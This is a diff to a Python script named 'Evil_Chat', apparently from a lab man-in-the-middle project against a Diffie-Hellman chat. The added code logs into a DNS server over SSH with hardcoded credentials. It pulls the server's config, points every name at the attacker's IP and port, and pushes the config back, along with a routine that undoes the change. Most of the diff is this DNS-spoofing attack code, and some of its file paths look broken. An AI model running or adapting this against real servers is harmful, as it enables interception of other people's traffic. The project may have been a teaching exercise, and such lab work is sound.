@@ -1,4 +1,5 @@
 import socket
+import paramiko
 from config import dns_ip, mitm_ip, ports, msg_length
 from diffie_hellman import DH_exchanger
 
@@ -16,25 +17,54 @@ class Evil_Chat(object):
         self.private = 123456
 
     def undo_attack(self):
+        # Rewrite the original data back to the file
         with open('dns_config - copy', 'r') as f:
             text = f.read()
         with open('dns_config', 'w') as f:
             f.write(text)
-
-    def attack(self):
-        # Get the dns table and modify it
         #
+        # Put the original file back
+        ssh = paramiko.SSHClient()
+        ssh.connect(dns_ip, username="dns", password="password")
+        sftp = ssh.open_sftp()
+        localpath = 'dns_config'
+        remotepath = '~/MITM/'
+        sftp.put(localpath, remotepath)
+        sftp.close()
+        ssh.close()
+
+        print('Reverted attack on the DNS server.')
+
+    def do_attack(self):
+        # Get the dns table and modify it
+        ssh = paramiko.SSHClient()
+        ssh.connect(dns_ip, username="dns", password="password")
+        sftp = ssh.open_sftp()
+        localpath = ''
+        remotepath = '~/MITM/dns_config'
+        sftp.get(remotepath, localpath)
+        sftp.close()
+        ssh.close()
+
+        # keep a copy of the original dns config
         with open('dns_config', 'r') as f:
             text = f.read()
-        with open('dns_config', 'r') as f:
-            ips = {l.split('=')[0]: l.split('=')[1] for l in f.readlines()}
+        with open('dns_config - copy', 'w') as f:
+            f.write(text)
         #
-        self.dns_table.update(ips)
 
         with open('dns_config', 'w') as f:
             f.write('\n'.join([f'{name}={mitm_ip}:{ports["mitm"]}' for name in self.dns_table.keys()]))
-        with open('dns_config - copy', 'w') as f:
-            f.write(text)
+
+        # Put the evil file in te dns
+        ssh = paramiko.SSHClient()
+        ssh.connect(dns_ip, username="dns", password="password")
+        sftp = ssh.open_sftp()
+        localpath = 'dns_config'
+        remotepath = '~/MITM/'
+        sftp.put(localpath, remotepath)
+        sftp.close()
+        ssh.close()
 
         print('DNS attacked and spoofed successfully.')
 
@@ -149,7 +179,12 @@ class Evil_Chat(object):
         action = input('Would you like to perform the attack first? [Y/N]: ')
 
         if 'y' in action.lower():
-            self.attack()
+            self.do_attack()
+
+        with open('dns_config - copy', 'r') as f:
+            ips = {l.split('=')[0]: l.split('=')[1] for l in f.readlines()}
+
+        self.dns_table.update(ips)
 
         mirror_chat = True if 'y' in input('Would you like to listen to chat passively? [Y/N]: ').lower() else False
 
